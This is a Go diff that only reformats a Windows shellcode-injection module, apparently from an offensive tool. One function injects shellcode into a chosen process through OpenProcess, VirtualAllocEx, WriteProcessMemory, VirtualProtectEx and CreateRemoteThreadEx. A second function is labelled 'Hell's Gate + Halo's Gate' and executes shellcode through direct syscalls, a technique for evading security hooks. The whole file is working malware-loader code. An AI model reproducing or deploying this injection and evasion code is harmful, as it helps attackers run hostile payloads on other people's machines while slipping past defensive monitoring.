@@ -1,81 +1,81 @@
 package core
 
 import (
-  //"fmt"
-  "unsafe"
-  "errors"
-  "syscall"
+	//"fmt"
+	"errors"
+	"syscall"
+	"unsafe"
 
-  "golang.org/x/sys/windows"
+	"golang.org/x/sys/windows"
 )
 
-func CreateRemoteThread(shellcode []byte, pid int) (error) {
-  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+func CreateRemoteThread(shellcode []byte, pid int) error {
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 
-  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
-  OpenProcess := kernel32.NewProc("OpenProcess")
-  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-  VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-  CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
-  CloseHandle := kernel32.NewProc("CloseHandle")
+	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
+	OpenProcess := kernel32.NewProc("OpenProcess")
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+	CloseHandle := kernel32.NewProc("CloseHandle")
 
-  var pHandle uintptr
+	var pHandle uintptr
 
-  if (pid == 0) {
-    pHandle, _, _ = GetCurrentProcess.Call()
-  } else {
-    pHandle, _, _ = OpenProcess.Call(
-      windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION,
-      uintptr(0),
-      uintptr(pid),
-    )
-  }
+	if pid == 0 {
+		pHandle, _, _ = GetCurrentProcess.Call()
+	} else {
+		pHandle, _, _ = OpenProcess.Call(
+			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
+			uintptr(0),
+			uintptr(pid),
+		)
+	}
 
-  addr, _, _ := VirtualAllocEx.Call(
-    uintptr(pHandle),
-    0,
-    uintptr(len(shellcode)),
-    windows.MEM_COMMIT | windows.MEM_RESERVE,
-    windows.PAGE_READWRITE,
-  )
+	addr, _, _ := VirtualAllocEx.Call(
+		uintptr(pHandle),
+		0,
+		uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
+	)
 
 	if addr == 0 {
 		return errors.New("VirtualAllocEx failed and returned 0")
 	}
 
-  WriteProcessMemory.Call(
-    uintptr(pHandle),
-    addr,
-    (uintptr)(unsafe.Pointer(&shellcode[0])),
-    uintptr(len(shellcode)),
-  )
+	WriteProcessMemory.Call(
+		uintptr(pHandle),
+		addr,
+		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+	)
 
-  oldProtect := windows.PAGE_READWRITE
-  VirtualProtectEx.Call(
-    uintptr(pHandle),
-    addr,
-    uintptr(len(shellcode)),
-    windows.PAGE_EXECUTE_READ,
-    uintptr(unsafe.Pointer(&oldProtect)),
-  )
+	oldProtect := windows.PAGE_READWRITE
+	VirtualProtectEx.Call(
+		uintptr(pHandle),
+		addr,
+		uintptr(len(shellcode)),
+		windows.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
 
-  CreateRemoteThreadEx.Call(
-    uintptr(pHandle),
-    0,
-    0,
-    addr,
-    0,
-    0,
-    0,
-  )
+	CreateRemoteThreadEx.Call(
+		uintptr(pHandle),
+		0,
+		0,
+		addr,
+		0,
+		0,
+		0,
+	)
 
-  _, _, errCloseHandle := CloseHandle.Call(pHandle)
-  if errCloseHandle != nil {
-    return errCloseHandle
-  }
+	_, _, errCloseHandle := CloseHandle.Call(pHandle)
+	if errCloseHandle != nil {
+		return errCloseHandle
+	}
 
-  return nil
+	return nil
 }
 
 /*
@@ -84,88 +84,87 @@ Hell's Gate + Halo's Gate technique
 
 */
 
-func CreateRemoteThreadHalos(shellcode []byte) (error) {
+func CreateRemoteThreadHalos(shellcode []byte) error {
 
-  NtAllocateVirtualMemory, err := GetSysId("NtAllocateVirtualMemory")
-  if err != nil {
-    return err
-  }
+	NtAllocateVirtualMemory, err := GetSysId("NtAllocateVirtualMemory")
+	if err != nil {
+		return err
+	}
 
-  NtWriteVirtualMemory, err := GetSysId("NtWriteVirtualMemory")
-  if err != nil {
-    return err
-  }
+	NtWriteVirtualMemory, err := GetSysId("NtWriteVirtualMemory")
+	if err != nil {
+		return err
+	}
 
-  NtProtectVirtualMemory, err := GetSysId("NtProtectVirtualMemory")
-  if err != nil {
-    return err
-  }
+	NtProtectVirtualMemory, err := GetSysId("NtProtectVirtualMemory")
+	if err != nil {
+		return err
+	}
 
-  NtCreateThreadEx, err := GetSysId("NtCreateThreadEx")
-  if err != nil {
-    return err
-  }
+	NtCreateThreadEx, err := GetSysId("NtCreateThreadEx")
+	if err != nil {
+		return err
+	}
 
-  var addr uintptr
-  regionsize := uintptr(len(shellcode))
+	var addr uintptr
+	regionsize := uintptr(len(shellcode))
 
-  r1, err := Syscall(
-    NtAllocateVirtualMemory,
-    uintptr(0xffffffffffffffff),
-    uintptr(unsafe.Pointer(&addr)),
-    0,
-    uintptr(unsafe.Pointer(&regionsize)),
-    windows.MEM_COMMIT | windows.MEM_RESERVE,
-    syscall.PAGE_READWRITE,
-  )
-  if (r1 != 0) {
-    return err
-  }
-  
-  Syscall(
-    NtWriteVirtualMemory,
-    uintptr(0xffffffffffffffff),
-    addr,
-    uintptr(unsafe.Pointer(&shellcode[0])),
-    uintptr(len(shellcode)),
-    0,
-  )
+	r1, err := Syscall(
+		NtAllocateVirtualMemory,
+		uintptr(0xffffffffffffffff),
+		uintptr(unsafe.Pointer(&addr)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		syscall.PAGE_READWRITE,
+	)
+	if r1 != 0 {
+		return err
+	}
 
-  var oldProtect uintptr
-  r2, err := Syscall(
-    NtProtectVirtualMemory,
-    uintptr(0xffffffffffffffff),
-    uintptr(unsafe.Pointer(&addr)),
-    uintptr(unsafe.Pointer(&regionsize)),
-    syscall.PAGE_EXECUTE_READ,
-    uintptr(unsafe.Pointer(&oldProtect)),
-  )
-  if (r2 != 0) {
-    return err
-  }
+	Syscall(
+		NtWriteVirtualMemory,
+		uintptr(0xffffffffffffffff),
+		addr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		0,
+	)
 
-  var hhosthread uintptr
-  r3, err := Syscall(
-    NtCreateThreadEx,
-    uintptr(unsafe.Pointer(&hhosthread)),
-    0x1FFFFF,
-    0,
-    uintptr(0xffffffffffffffff),
-    addr,
-    0,
-    uintptr(0),
-    0,
-    0,
-    0,
-    0,
-  )
+	var oldProtect uintptr
+	r2, err := Syscall(
+		NtProtectVirtualMemory,
+		uintptr(0xffffffffffffffff),
+		uintptr(unsafe.Pointer(&addr)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if r2 != 0 {
+		return err
+	}
 
-  syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	var hhosthread uintptr
+	r3, err := Syscall(
+		NtCreateThreadEx,
+		uintptr(unsafe.Pointer(&hhosthread)),
+		0x1FFFFF,
+		0,
+		uintptr(0xffffffffffffffff),
+		addr,
+		0,
+		uintptr(0),
+		0,
+		0,
+		0,
+		0,
+	)
 
-  if (r3 != 0) {
-    return err
-  }
+	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
 
-  return nil
+	if r3 != 0 {
+		return err
+	}
+
+	return nil
 }
-
